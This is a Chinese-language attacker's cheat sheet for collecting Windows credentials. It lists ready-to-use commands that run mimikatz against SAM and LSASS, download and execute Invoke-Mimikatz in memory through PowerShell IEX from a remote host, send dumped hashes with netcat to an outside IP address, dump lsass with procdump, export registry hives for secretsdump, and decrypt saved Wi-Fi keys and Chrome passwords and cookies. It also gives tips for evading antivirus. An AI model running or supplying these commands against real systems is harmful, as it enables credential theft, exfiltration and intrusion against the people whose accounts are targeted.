# 凭证信息收集

## 凭证获取工具
常用来获取windows密码的工具:
1、mimikatz
2、wce
3、pwddump7
4、ophcrack
5、procdump+mimikatz
6、LaZagne

密码HASH
LM & NTLM

Windows本地hash:
https://www.secpulse.com/archives/65256.html

Vindows系统下hash密码格式:
用户名称:RID:LM-HASH值:NT-HASH值

## Mimikatz
mimikatz For Win10T载:

https://github.com/gentilkiwi/mimikatz/releases

本地非交互式凭证获取:
```ts
mimikatz.exe "log res.txt" "privilege::debug" "token::elevate" "lsadump::sam" "exit"
mimikatz.exe "log logon.txt" "privilege::debug" "sekurlsa::logonpasswords" " exit"
```

__1x版本:__
```sh
privilege::debug       //提升权限
inject::process lsass.exe sekurlsa.dl   //注入sekurlsa.dl到lsass.exe进程里
@getLogonPasswords     //获取密码
```

__Powershell远程加载mimikatz脚本__
```ts
// IEX是加载到内存中执行的。
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.159.130/1');Invoke-Mimikatz -DumpCreds
powershell "IEX (New-Object Net.WebClient).DownloadString('http://192.168.159.130/1');Invoke-Mimikatz -DumpCreds"
```
杀软绕过:
1.大写小写。
2.用+号 拼凑。。
[Mimikatz的18种免杀姿势及防御策略](https://www.freebuf.com/articles/system/234365.html)
```ts
v2.0 https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1
v2.2 https://raw.githubusercontent.com/Mr-xn/Penetration_Testing_POC/master/tools/Invoke-Mimikatz.ps1
```

输出重定向

```
攻击机: nc -lvvp 6666 > pass123.txt
靶机  : mimikatz.exe "log res.txt" "privilege::debug" "token::elevate" "lsadump::sam" "exit" | nc.exe -v 47.101.214.85 6666
```
powershell IEX (New-Object Net.WebClient).DownloadString('https://127.0.0.1/f');Get-PassHashes // 不好使

### FAQ 不能执行 powershell远程命令
```ps
set-ExecutionPolicy RemoteSigned
或 Set-ExecutionPolicy -Scope CurrentUser
get-ExecutionPolicy
```

## 导出密码的几种方式
https://www.daimajiaoliu.com/daima/486f56b9d900403

procdump导出
```ts
procdump64.exe -accepteula -ma lsass.dmp
mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonPasswords full
```


## wce获取明文密码 win7及以下
wce -w
## pwddump7 获取hash
Pwddump7.exe > pass.txt
https://www.objectif-securite.ch/ophcrack

如果网站无法破解出hash值·我们可以使用ophcrack工具配合彩虹表自己破解.
工具下载:https://ophcrack.sourceforge.io/
彩虹表:
https://ophcrack.sourceforge.io/tables.php
http://project-rainbowcrack.com/table.htm
## Procdump+Mimikatz

Procdump lsass 进程导出:
For 32bits: procdump.exe -accepteula -ma lsass.exe lsass.dmp
For 64bits: procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp
然后使用mimikatz还原密码:
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" "exit"

## 注册表导出hash
reg save HKLM\SYSTEM system.hiv
reg save HKLM\SAM sam.hiv
reg save HKLM\SECURITY security.hiv
导出后可以使用cain导人system.hiv.security.hiv获取统存中的明文信息.
mimikatz "lsadump sam /system:system.hiv /sam:sam.hiv" exit

python3 -m pip install impacket
windows:  python secretsdump.py -sam sam.hiv -security security.hiv-system system.hiv LOCAL
linux:          impacket -secretsdump -system system.hiv -ntds ntds.dit LOCAL

## sharpdump

## Windows Wifi密码的获取
netsh wlan show profile
netsh wlan show profile name="ssid" key=clear
## 看hosts
C:\Windows\System32\drivers\etc\hosts

## Windows IIS config
lIS6:
cscript.exe C:\Inetpub\AdminScripts\adsutil.vbs ENUM W3SVC/1/root

IIS7,8:
列出网站列表:%systemroot%/system32/inetsrv/appcmd.exe list site
列出网站物理路:%systemroot%\system32\inetsr\appcmd.exe list vdir
Mimikatz读取lIS7配置文件密码:
mimikatz.exe privilege:debug log "iis:apphost /in:"%systemroot%\system32\inetsr\config\applicationHost.config" /live" exit

## windows回收站信息获取
FOR /f "skip=1 tokens=1,2 delims=" %c in ('wmic useraccount get name^,sid') do dir /a/b C:\$Recycle.Bin\%d\ ^>%c.txt

## Chrpme的密码和cookie获取
%localappdata%\Google\chrome\USERDA~1\default\LOGIND~ 1
%localappdata%\Google\chrome\USERDA~1\default\cookies

chrome的用户信息·保存在本地文件为sqlite数据库格式

mimikatz.exe privilege::debug log "dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\cookies /unprotect" exit

mimikatz.exe privilege::debug log "dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\LOGIND~1" exit # 读chrome密码
## __lazagne__ 综合获取信息
